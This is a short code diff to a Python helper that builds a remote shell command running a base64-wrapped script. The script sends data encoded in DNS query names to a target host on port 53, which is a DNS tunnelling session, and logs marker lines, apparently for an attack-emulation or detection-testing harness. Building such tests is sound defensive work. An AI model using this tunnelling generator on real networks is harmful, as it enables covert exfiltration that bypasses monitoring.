@@ -309,6 +309,7 @@ def dns_tunnel_session_command(
         "    sock.sendto(make_query(fqdn), (T, 53))\n"
         "    with open(MARKER, \"a\", encoding=\"ascii\") as mh:\n"
         "        mh.write(\"DNS_TUNNEL_SENT:\" + fqdn + \"\\n\")\n"
+        "        mh.flush()\n"
         "\n"
         "open(MARKER, \"w\").close()\n"
         "with tempfile.TemporaryDirectory() as td:\n"
@@ -330,14 +331,11 @@ def dns_tunnel_session_command(
         "                time.sleep(I)\n"
         "    send(sock, \"end-0.\" + D)\n"
         "    sock.close()\n"
+        "with open(MARKER, \"a\", encoding=\"ascii\") as mh:\n"
+        "    mh.write(\"DNS_TUNNEL_SESSION_DONE\\n\")\n"
     )
     inner = _python3_b64_exec_command(script)
-    pipeline = (
-        f"rm -f {shlex.quote(marker_output_path)}; "
-        f"{inner}; "
-        f"cat {shlex.quote(marker_output_path)} 2>/dev/null; "
-        f"printf '%s\\n' DNS_TUNNEL_SESSION_DONE"
-    )
+    pipeline = f"rm -f {shlex.quote(marker_output_path)}; {inner}"
     command = wrap_remote_shell_command(pipeline)
     if suppress_errors:
         return f"{command} 2>/dev/null || true"
